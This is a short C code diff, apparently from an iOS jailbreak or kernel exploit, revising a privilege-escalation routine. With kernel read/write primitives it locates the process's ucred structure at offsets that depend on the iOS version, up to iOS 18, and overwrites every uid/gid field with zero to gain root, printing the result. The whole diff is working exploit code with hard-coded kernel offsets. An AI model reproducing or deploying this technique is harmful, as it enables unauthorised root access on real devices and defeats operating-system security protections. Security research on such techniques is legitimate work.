@@ -2128,15 +2128,23 @@ bool platformize_proc(void) {
     }
 
     // 2a. Read our own real ucred first (we have KRW; no list walking needed).
-    // proc->p_proc_ro (0x18) -> proc_ro->p_ucred (0x20 for <=17.x, 0x28 on 18).
+    // proc->p_proc_ro (0x18) -> proc_ro->p_ucred (0x20 on <=iOS 17, 0x28 on 18).
     uint64_t ourProcRo = kread_ptr(gOurProc + 0x18);
-    uint64_t ourUcred  = kread_ptr(ourProcRo + 0x28);
-    printf("[elev] ours: proc_ro=0x%llx ucred=0x%llx\n", ourProcRo, ourUcred);
+    uint64_t ourUcred28 = kread_ptr(ourProcRo + 0x28);
+    uint64_t ourUcred20 = kread_ptr(ourProcRo + 0x20);
+    uint64_t ourUcred   = looks_kernel(ourUcred28) ? ourUcred28
+                      : looks_kernel(ourUcred20) ? ourUcred20
+                      : 0;
+    printf("[elev] proc_ro=0x%llx ucred(0x28)=0x%llx ucred(0x20)=0x%llx resolved=0x%llx\n",
+           ourProcRo, ourUcred28, ourUcred20, ourUcred);
+    if (!ourUcred) {
+        printf("[-] ucred lookup failed\n");
+        return false;
+    }
 
-    // 2b. Zero all POSIX uid/gid words in place. iOS 18 evaluates ucred by
-    // reference (it points INTO this same struct), so writing cr_uid/r-uid/svuid/
-    // -> kuid_t(0) plus cr_rgid/cr_svgid == 0 makes every getuid*() succeed as
-    // root. cr_gid likewise; launchd itself stays untouched.
+    // 2b. Zero all POSIX uid/gid words in place. ucred->cr_uid/r-uid/svuid are
+    // at +0x18/1c/20; cr_gid/r- at +0x24/28/2c. Writing every word 0 from 0x18
+    // through 0x2c makes every uid/gid evaluation match root.
     for (uint64_t off = 0x18; off <= 0x2c; off += 4) kwrite32(ourUcred + off, 0);
     printf("[elev] ucred uid/gid zeroed: uid=%d gid=%d\n", getuid(), getgid());
     gOurUcred = ourUcred;
